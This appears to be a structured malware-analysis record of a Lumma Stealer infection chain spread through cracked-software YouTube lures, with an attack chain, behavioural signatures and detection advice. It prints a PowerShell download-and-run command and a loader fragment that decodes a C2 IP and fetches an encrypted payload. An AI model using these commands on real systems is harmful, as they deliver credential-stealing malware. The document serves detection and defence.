package_info.package_name: Lumma Stealer Variant (delivered via cracked software YouTube campaign)
package_info.package_manager: N/A (malware distributed as ZIP containing LNK, .NET EXE, DLL)
package_info.package_versions: N/A (campaign-based, not versioned as a package)
package_info.why_malicious: The entire package chain is designed to covertly deliver and execute Lumma Stealer, a credential and information stealer, using deceptive cracked software lures, obfuscated loaders, anti-analysis techniques, and C2 exfiltration.

execution_context.trigger: user execution (via LNK file in ZIP)

malicious_snippets.code_snippet:
LNK file calls PowerShell to download and execute a .NET EXE from GitHub:
powershell -Command "Invoke-WebRequest -Uri 'hxxps://github[.]com/John1323456/New/raw/main/Installer-Install-2023_v0y.6.6.exe' -OutFile 'Installer-Install-2023_v0y.6.6.exe'; Start-Process 'Installer-Install-2023_v0y.6.6.exe'"
malicious_snippets.code_behavior: On user execution, the LNK file launches PowerShell to download a remote .NET executable from GitHub and execute it, initiating the malware chain.

malice_analysis.why_suspicious: LNK files in cracked software ZIPs that launch PowerShell to download and run executables are a common malware delivery vector.
malice_analysis.violated_expectations: Legitimate installers do not use LNK files to silently invoke PowerShell for remote code download and execution.
malice_analysis.similar_legitimate_use: Enterprise deployment scripts may use PowerShell for automation, but not in consumer software installers.

malicious_snippets.code_behavior: At runtime, the loader checks system environment variables for anti-analysis, then launches a hidden PowerShell process with redirected input to execute a malicious script.

malice_analysis.why_suspicious: Obfuscated .NET loaders that perform environment checks and launch hidden PowerShell are typical of malware loaders.
malice_analysis.violated_expectations: Normal installers do not obfuscate code, perform anti-analysis checks, or launch hidden PowerShell sessions.
malice_analysis.similar_legitimate_use: Some enterprise tools may use hidden PowerShell for automation, but not in consumer software.

malicious_snippets.code_snippet:
# PowerShell (partial, as described)
$ip_b64 = 'MTc2LjExMy4xMTUuMjI0'; # Base64 for 176.113.115.224
$ip = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($ip_b64))
# Selects server based on system date
Invoke-WebRequest -Uri "http://$ip:29983" -OutFile "stage2.bin"
# Decrypts with AES CBC, decompresses with GZip, loads DLL via [System.Reflection.Assembly]::Load()
malicious_snippets.code_behavior: At runtime, the script decodes a C2 server IP, downloads an encrypted payload, decrypts and decompresses it, then loads a DLL into memory for further execution.

malice_analysis.why_suspicious: Dynamic C2 selection, encrypted payload delivery, and in-memory DLL loading are advanced malware techniques.
malice_analysis.violated_expectations: Legitimate scripts do not download, decrypt, and execute code from untrusted remote servers.

malicious_snippets.code_behavior: At runtime, the DLL performs anti-VM and anti-debug checks (window titles, modules, usernames, WMI, files), then suspends its thread to prepare for payload injection.

malice_analysis.why_suspicious: Comprehensive anti-analysis logic is a hallmark of evasive malware.
malice_analysis.violated_expectations: Legitimate DLLs do not check for debuggers, sandboxes, or virtualization artifacts.

malicious_snippets.code_behavior: At runtime, the stealer connects to a C2 server, checks in, receives instructions, and exfiltrates compressed stolen data (system info, credentials, browser data) via HTTPS POST.

malice_analysis.why_suspicious: Automated exfiltration of sensitive data to remote C2 servers is a core indicator of infostealer malware.
malice_analysis.violated_expectations: Legitimate software does not exfiltrate user data to unknown servers.

attack_chain.action: User downloads ZIP from YouTube link and executes LNK file, which launches PowerShell to download .NET loader.
Obfuscated .NET loader performs environment checks and launches hidden PowerShell with malicious script.
PowerShell script selects C2, downloads encrypted payload, decrypts and decompresses DLL, loads it in memory.
DLL performs anti-VM/anti-debug checks, prepares for payload injection.
Lumma Stealer payload collects and exfiltrates sensitive data to C2 server.

behavioral_signatures: LNK files in ZIPs launching PowerShell for remote code download
PowerShell scripts decoding C2 addresses and downloading encrypted payloads
In-memory DLL loading and thread suspension
Automated HTTPS POST exfiltration of compressed data
file_indicators: Presence of LNK files invoking PowerShell in cracked software ZIPs
detection_knowledge.how_to_detect: Monitor for LNK files in user downloads that invoke PowerShell to fetch remote executables, especially from file-sharing or GitHub URLs. Detect obfuscated .NET binaries with SmartAssembly signatures and hidden PowerShell process launches. Flag PowerShell scripts that decode Base64 C2 addresses and perform AES decryption of downloaded binaries. Alert on in-memory DLL loading and thread suspension behaviors. Monitor for outbound HTTPS POST requests to known Lumma Stealer C2 IPs/domains, especially with compressed or encrypted payloads.
